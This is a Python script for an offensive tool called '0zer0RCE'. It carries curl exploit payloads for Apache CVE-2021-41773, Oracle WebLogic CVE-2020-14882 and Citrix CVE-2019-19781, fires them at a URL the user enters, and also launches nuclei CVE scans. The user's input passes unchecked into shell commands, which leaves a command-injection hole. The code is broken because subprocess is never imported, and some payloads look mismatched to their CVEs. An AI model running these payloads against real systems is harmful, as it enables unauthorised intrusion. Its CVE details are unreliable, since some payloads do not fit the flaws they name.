# 0zer0RCE - Remote Code Execution Scanner & Exploiter
# Author: AryzXploit
# nak rename? ijin owner dulu

import os
import sys
import requests
import json
import pyfiglet
import time
from termcolor import colored

secret_path = os.path.expanduser('~/.0zer0RCE/')
auth_status_file = os.path.join(secret_path, 'auth_status.json')

if not os.path.exists(auth_status_file):
    print(colored("❌ Unauthorized Access! Please login through Start.py.", 'red'))
    sys.exit(1)

with open(auth_status_file, 'r') as file:
    auth_status = json.load(file)

if not auth_status.get('authenticated') or 'token' not in auth_status:
    print(colored("❌ Unauthorized Access! Please login through Start.py.", 'red'))
    sys.exit(1)

print(colored("✅ Access Granted!", 'green'))
time.sleep(3)

RCE_PAYLOADS = [
    {
        "cve": "CVE-2021-41773",
        "description": "Apache HTTP Server 2.4.49 Path Traversal and Remote Code Execution",
        "payload": "curl -X POST --data 'echo; id' http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
    },
    {
        "cve": "CVE-2020-14882",
        "description": "Oracle WebLogic Server RCE",
        "payload": "curl -X POST -H 'User-Agent: () { :;}; echo; /bin/bash -c \"id\"' http://target/console/images/%252E%252E%252Fconsole.portal"
    },
    {
        "cve": "CVE-2019-19781",
        "description": "Citrix ADC RCE via Path Traversal",
        "payload": "curl -k -X POST -d 'nsroot:nsroot' https://target/vpn/../vpns/cfg/smb.conf"
    }
]

def show_available_rce_payloads():
    print(colored('📜 Available RCE Payloads:', 'yellow'))
    for payload in RCE_PAYLOADS:
        print(colored(f"- {payload['cve']} - {payload['description']}", 'cyan'))

def scan_single_url(url):
    print(colored(f'🔍 Scanning {url} for RCE vulnerabilities...', 'yellow'))

    for payload in RCE_PAYLOADS:
        print(colored(f"[-] Testing {payload['cve']} - {payload['description']}", 'cyan'))
        command = payload['payload'].replace("http://target", url)

        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            if "uid=" in result.stdout:
                print(colored(f"[✅] Vulnerable to {payload['cve']}", 'green'))
            else:
                print(colored('[❌] Not Vulnerable', 'red'))
        except Exception as e:
            print(colored(f'[!] Error: {e}', 'red'))

def run_nuclei_scan(target):
    print(colored(f'🔍 Running Nuclei scan on {target}...', 'yellow'))
    os.system(f'nuclei -u {target} -t cves/ -o nuclei_results.txt')
    print(colored('[✅] Nuclei scan completed!', 'green'))

def main():
    os.system('cls' if os.name == 'nt' else 'clear')


    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(colored(pyfiglet.figlet_format('0zer0RCE', font='slant'), 'red'))
        print(colored('1. Single URL Scan', 'yellow'))
        print(colored('2. Nuclei Machine Scanner', 'yellow'))
        print(colored('3. Show Available RCE Payloads', 'yellow'))
        print(colored('0. Exit', 'yellow'))

        choice = input(colored('🤖 Pilih opsi: ', 'yellow'))

        if choice == '1':
            url = input(colored('🌐 Masukkan URL target: ', 'yellow'))
            scan_single_url(url)
            input(colored('Press Enter to continue...', 'cyan'))

        elif choice == '2':
            target = input(colored('🌐 Masukkan Target untuk Nuclei Scanner: ', 'yellow'))
            run_nuclei_scan(target)
            input(colored('Press Enter to continue...', 'cyan'))

        elif choice == '3':
            show_available_rce_payloads()
            input(colored('Press Enter to continue...', 'cyan'))

        elif choice == '0':
            os.system('cls' if os.name == 'nt' else 'clear')
            print(colored(pyfiglet.figlet_format('GoodBye Sir', font='slant'), 'green'))
            break

        else:
            print(colored('❌ Invalid Option! Please try again.', 'red'))
            time.sleep(3)


if __name__ == '__main__':
    main()
